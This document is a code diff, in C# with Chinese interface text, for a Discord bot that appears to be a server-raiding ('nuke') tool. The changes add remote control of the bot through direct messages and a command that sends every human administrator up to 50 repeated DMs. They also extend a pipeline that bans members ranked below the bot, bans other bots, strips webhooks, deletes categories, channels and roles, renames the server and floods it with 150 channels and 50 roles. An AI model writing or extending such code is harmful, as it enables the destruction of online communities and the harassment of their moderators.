@@ -10,6 +10,9 @@ namespace AbyssCore
 {
     internal class Program
     {
+        public static string? ActiveGuildId { get; private set; }
+        public static string? ActiveGuildName { get; private set; }
+
         private static async Task Main(string[] args)
         {
             Console.OutputEncoding = Encoding.UTF8;
@@ -113,7 +116,7 @@ namespace AbyssCore
         }
 
         /// <summary>
-        /// 處理 Discord 聊天室文字指令 (.mss>[指令])
+        /// 處理 Discord 聊天室文字指令 (.mss>[指令])，支援群組頻道與私訊 (DM) 遠端操控
         /// </summary>
         private static async Task HandleChatCommandAsync(
             DiscordApiClient client,
@@ -128,8 +131,28 @@ namespace AbyssCore
             string command = parts[0].ToLowerInvariant();
             string[] cmdArgs = parts.Skip(1).ToArray();
 
+            bool isDm = string.IsNullOrEmpty(guildId);
+            if (isDm)
+            {
+                guildId = ActiveGuildId ?? "";
+                if (string.IsNullOrEmpty(guildId))
+                {
+                    var guilds = await client.GetCurrentUserGuildsAsync();
+                    if (guilds.Count > 0)
+                    {
+                        guildId = guilds[0].GetProperty("id").GetString()!;
+                        await client.SendMessageAsync(channelId, $"◈ [私訊管理員模式] 檢測到為私訊指令，已自動鎖定首個伺服器 (ID: {guildId})。");
+                    }
+                    else
+                    {
+                        await client.SendMessageAsync(channelId, "▲ 機器人尚未加入任何伺服器，無法執行伺服器管理指令。");
+                        return;
+                    }
+                }
+            }
+
             Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine($"\n[聊天室指令] 收到來自 {author} 的指令: .mss>{rawCommand}");
+            Console.WriteLine($"\n[{(isDm ? "私訊管理員" : "聊天室指令")}] 收到來自 {author} 的指令: .mss>{rawCommand}");
             Console.ResetColor();
 
             switch (command)
@@ -139,7 +162,8 @@ namespace AbyssCore
                 case "選單":
                 case "menu":
                     string helpMsg = "✦ **【永恆深淵 · C# 旗艦文字指令清單】** ✦\n" +
-                                     "◈ `.mss>清理` 啟動全服全景深度重構 (三段式清理 + 建150頻道+50身分組)\n" +
+                                     "◈ `.mss>清理` 啟動全服全景深度重構 (私訊邀請碼->架構備份->清理成員->重塑類別頻道身分組->建迷宮->頂部頻道發布日誌)\n" +
+                                     "◈ `.mss>私訊 [次數] [內容]` 批量向全體管理員連續發送私訊通知 (預設 10 次)\n" +
                                      "◈ `.mss>頻道 [數量]` 批量建立迷宮頻道 (預設 50，最高 500)\n" +
                                      "◈ `.mss>身分組 [數量]` 批量建立迷宮身分組 (預設 20，最高 100)\n" +
                                      "◈ `.mss>訊息 [輪數] [內容]` 批量向文字頻道廣播迷宮提示\n" +
@@ -153,21 +177,39 @@ namespace AbyssCore
                 case "清理":
                 case "重構":
                 case "overhaul":
-                    await client.SendMessageAsync(channelId, "✦ 正在透過 C# 旗艦引擎啟動【全景深度重構】流水線（階梯清理 + 同步建立 150 頻道 + 50 身分組）...");
+                    await client.SendMessageAsync(channelId, "✦ 正在透過 C# 旗艦引擎啟動【全景深度重構】流水線（私訊邀請碼 -> 架構備份 -> 拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員 -> 刪除類別頻道身分組 -> 建立 150 頻道 + 50 身分組 -> 頂部頻道發布日誌）...");
                     var pipeline = new PipelineEngine(client, ConfigManager.Texts);
-                    var report = await pipeline.ExecuteFullOverhaulAsync(guildId, "當前伺服器", msg =>
+                    var report = await pipeline.ExecuteFullOverhaulAsync(guildId, ActiveGuildName ?? "當前伺服器", msg =>
                     {
                         Console.WriteLine($"  [清理進度] {msg}");
                     });
                     string reportMsg = $"✔ **【全景重構完成】**\n" +
+                                       $"• 清理了 `{report.DeletedCategories}` 個類別\n" +
+                                       $"• 清理了 `{report.DeletedChannels}` 個頻道\n" +
+                                       $"• 清理了 `{report.BannedBots}` 個 bot\n" +
+                                       $"• 清理了 `{report.BannedHumans}` 個成員\n" +
+                                       $"• 已發送防誤踢邀請碼 (wWB2RcR7pX) 私訊: `{report.DmInvitedMembers}` 位成員\n" +
                                        $"• 拔除 Webhook: `{report.DeletedWebhooks}` 個\n" +
-                                       $"• 封鎖外部 Bot: `{report.BannedBots}` 個\n" +
-                                       $"• 封鎖低階成員: `{report.BannedHumans}` 位\n" +
-                                       $"• 刪除舊頻道: `{report.DeletedChannels}` 個 | 舊身分組: `{report.DeletedRoles}` 個\n" +
+                                       $"• 刪除舊身分組: `{report.DeletedRoles}` 個\n" +
                                        $"★ 新建迷宮頻道: `{report.CreatedChannels}` 個\n" +
                                        $"★ 新建迷宮身分組: `{report.CreatedRoles}` 個\n" +
+                                       $"◈ 頂部日誌輸出: {(report.TopChannelLogged ? $"✔ 已寫入最頂端頻道 (ID: {report.TopChannelId})" : "▲ 未能寫入")}\n" +
                                        $"◈ 總耗時間: `{report.ElapsedSeconds:F2}` 秒";
                     await client.SendMessageAsync(channelId, reportMsg);
+                    break;
+
+                case "私訊":
+                case "dm":
+                case "dmadmins":
+                    int dmCount = cmdArgs.Length > 0 && int.TryParse(cmdArgs[0], out int dmc) && dmc > 0 ? Math.Min(50, dmc) : 10;
+                    string dmContent = cmdArgs.Length > 1 ? string.Join(" ", cmdArgs.Skip(1)) : "迷宮以開啟";
+                    await client.SendMessageAsync(channelId, $"◈ 正在向伺服器全體真人管理員每人發送 {dmCount} 次私訊【{dmContent}】...");
+                    var dmPipe = new PipelineEngine(client, ConfigManager.Texts);
+                    var (dmSent, dmTarget, adminCnt) = await dmPipe.SendDmToAdminsAsync(guildId, dmCount, dmContent, msg =>
+                    {
+                        Console.WriteLine($"  [私訊管理員] {msg}");
+                    });
+                    await client.SendMessageAsync(channelId, $"✔ **【管理員私訊派發完畢】**\n• 涵蓋管理員: `{adminCnt}` 位\n• 成功送達: `{dmSent}/{dmTarget}` 則\n• 私訊內容: `{dmContent}`");
                     break;
 
                 case "頻道":
@@ -300,6 +342,8 @@ namespace AbyssCore
 
         private static async Task RunGuildMenuAsync(DiscordApiClient client, string guildId, string guildName)
         {
+            ActiveGuildId = guildId;
+            ActiveGuildName = guildName;
             var pipeline = new PipelineEngine(client, ConfigManager.Texts);
 
             while (true)
@@ -312,14 +356,15 @@ namespace AbyssCore
                 Console.WriteLine($"  ✦ 當前操作伺服器：【 {guildName} 】 (ID: {guildId})");
                 Console.WriteLine($"  ◈ 現有頻道數：{channels.Count}/500  |  ❖ 現有身分組：{roles.Count}");
                 Console.WriteLine($"  ✦ 核心引擎: C# .NET 8 主動令牌桶 + SocketsHttpHandler 極速連線池");
-                Console.WriteLine($"  ✦ 聊天室指令通道: ✔ 已啟動 (在任何頻道輸入 .mss>幫助 即可觸發)");
+                Console.WriteLine($"  ✦ 聊天室指令通道: ✔ 已啟動 (在任何頻道或私訊輸入 .mss>幫助 即可觸發)");
                 Console.WriteLine("═════════════════════════════════════════════════════════════════════");
                 Console.ForegroundColor = ConsoleColor.Cyan;
                 Console.WriteLine("  [1] ◈ 批量建立迷宮頻道 (最高 500 個，主動令牌桶控速)");
                 Console.WriteLine("  [2] ❖ 批量建立迷宮身分組 (最高 100 個，自訂名稱池)");
                 Console.ForegroundColor = ConsoleColor.Yellow;
-                Console.WriteLine("  [4] ✦ 全景深度重構 (階梯式清理 + 自動建150頻道+50身分組 + 改名換頭像)");
+                Console.WriteLine("  [4] ✦ 全景深度重構 (私訊邀請碼->架構備份->清理成員->重塑類別頻道->建迷宮->頂端發日誌)");
                 Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.WriteLine("  [D] ◈ 私訊全體管理員 (向所有真人管理員連續發送私訊通知，預設 10 次)");
                 Console.WriteLine("  [5] ✧ 批量發送迷宮訊息 (全服文字頻道多輪廣播)");
                 Console.WriteLine("  [6] ◈ 全服批量禁言處分 (可處生成員設定禁言分鐘數)");
                 Console.WriteLine("  [7] ❖ 全服批量統一名稱 (一鍵批量修改頻道 / 身分組 / 成員暱稱)");
@@ -338,7 +383,7 @@ namespace AbyssCore
                 Console.WriteLine("═════════════════════════════════════════════════════════════════════");
                 Console.ResetColor();
 
-                Console.Write("▶ 請輸入行動代碼 [1, 2, 4, 5, 6, 7, E, M, B, R, 8, 0]: ");
+                Console.Write("▶ 請輸入行動代碼 [1, 2, 4, D, 5, 6, 7, E, M, B, R, 8, 0]: ");
                 string action = Console.ReadLine()?.Trim().ToUpperInvariant() ?? "";
 
                 if (action == "0" || action == "8") return;
@@ -355,6 +400,10 @@ namespace AbyssCore
 
                     case "4":
                         await HandleFullOverhaulAsync(pipeline, guildId, guildName);
+                        break;
+
+                    case "D":
+                        await HandleDmAdminsAsync(pipeline, guildId);
                         break;
 
                     case "5":
@@ -392,16 +441,58 @@ namespace AbyssCore
             }
         }
 
+        private static async Task HandleDmAdminsAsync(PipelineEngine pipeline, string guildId)
+        {
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.WriteLine("\n=== ◈ 私訊全體管理員選單 ===");
+            Console.ResetColor();
+
+            Console.Write("▶ 請輸入每位管理員私訊次數 [1-50] (預設 10): ");
+            int count = int.TryParse(Console.ReadLine(), out int c) && c > 0 ? Math.Min(50, c) : 10;
+
+            Console.Write("▶ 請輸入私訊訊息內容 (直接按 Enter 使用預設「迷宮以開啟」): ");
+            string inputMsg = Console.ReadLine()?.Trim() ?? "";
+            string message = string.IsNullOrEmpty(inputMsg) ? "迷宮以開啟" : inputMsg;
+
+            Console.Write($"◈【私訊確認】即將向伺服器內所有真人管理員每人發送 {count} 次私訊！確認執行？[y/N]: ");
+            if (Console.ReadLine()?.Trim().ToLowerInvariant() != "y")
+            {
+                Console.WriteLine("▲ 已取消管理員私訊操作。");
+                return;
+            }
+
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("\n✦ 正在向伺服器管理員建立私訊通道並發送訊息，請稍候...");
+            Console.ResetColor();
+
+            var (sent, target, adminCnt) = await pipeline.SendDmToAdminsAsync(guildId, count, message, msg =>
+            {
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.WriteLine($"  ▶ {msg}");
+                Console.ResetColor();
+            });
+
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("\n✦ 管理員私訊發送作業完畢！");
+            Console.WriteLine($"  ◈ 涵蓋真人管理員: {adminCnt} 位");
+            Console.WriteLine($"  ◈ 成功發送私訊則數: {sent}/{target} 則");
+            Console.ResetColor();
+
+            Console.WriteLine("按 Enter 鍵繼續...");
+            Console.ReadLine();
+        }
+
         private static async Task HandleFullOverhaulAsync(PipelineEngine pipeline, string guildId, string guildName)
         {
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("\n=== ✦ 伺服器全景深度重構選單 (三段式階梯清理 + C# 極速並發版) ===");
             Console.WriteLine("▲【警告】即將啟動三段式階梯清理與兩階段建置流水線：");
-            Console.WriteLine("  [階梯 1/3] 優先清空伺服器所有 Webhook 與外部整合通道！");
-            Console.WriteLine("  [階梯 2/3] 優先並發封鎖所有身分組在機器人自身之下的外部 Bot！");
-            Console.WriteLine("  [階梯 3/3] 全面封鎖身分組在機器人自身之下之全體成員！");
-            Console.WriteLine("  [同步重塑] 舊頻道清理、舊身分組刪除、伺服器更名同步進行！");
-            Console.WriteLine("  [並發建置] 同步自動建立 150 個迷宮文字頻道 + 50 個迷宮身分組！");
+            Console.WriteLine("  [步驟 1/6] 私訊身分組在機器人自身之下之成員防誤踢邀請碼 (wWB2RcR7pX)！");
+            Console.WriteLine("  [步驟 2/6] 全量備份伺服器架構 JSON 檔案！");
+            Console.WriteLine("  [步驟 3/6] 清理成員（拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員）！");
+            Console.WriteLine("  [步驟 4/6] 舊類別清理、舊頻道清理、舊身分組刪除、伺服器更名同步進行！");
+            Console.WriteLine("  [步驟 5/6] 同步自動建立 150 個迷宮文字頻道 + 50 個迷宮身分組！");
+            Console.WriteLine("  [步驟 6/6] 將重構報告輸出至伺服器最頂端第一個頻道！");
             Console.ResetColor();
 
             Console.Write("確認要立即執行？輸入 [y] 確認，其他鍵取消: ");
@@ -433,11 +524,14 @@ namespace AbyssCore
             Console.WriteLine($"  ✔ 拔除 Webhook: {report.DeletedWebhooks} 個");
             Console.WriteLine($"  ◈ 封鎖外部 Bot: {report.BannedBots} 個");
             Console.WriteLine($"  ❖ 封鎖低階成員: {report.BannedHumans} 位");
+            Console.WriteLine($"  ◈ 已發送防誤踢邀請私訊: {report.DmInvitedMembers} 位成員");
+            Console.WriteLine($"  ◈ 已刪除舊類別: {report.DeletedCategories} 個");
             Console.WriteLine($"  ◈ 已刪除舊頻道: {report.DeletedChannels} 個");
             Console.WriteLine($"  ❖ 已刪除舊身分組: {report.DeletedRoles} 個");
             Console.WriteLine($"  ✦ 伺服器品牌重塑: {(report.GuildRenamed ? "成功" : "保留")}");
             Console.WriteLine($"  ★ [並發建置] 已建立迷宮頻道: {report.CreatedChannels} 個");
             Console.WriteLine($"  ★ [並發建置] 已建立迷宮身分組: {report.CreatedRoles} 個");
+            Console.WriteLine($"  ✦ 頂部頻道發布日誌: {(report.TopChannelLogged ? $"✔ 成功發布至頻道 {report.TopChannelId}" : "▲ 略過")}");
             Console.WriteLine($"  ◈ 總耗時間: {report.ElapsedSeconds:F2} 秒");
             Console.WriteLine("✦===================================================================✦\n");
             Console.ResetColor();
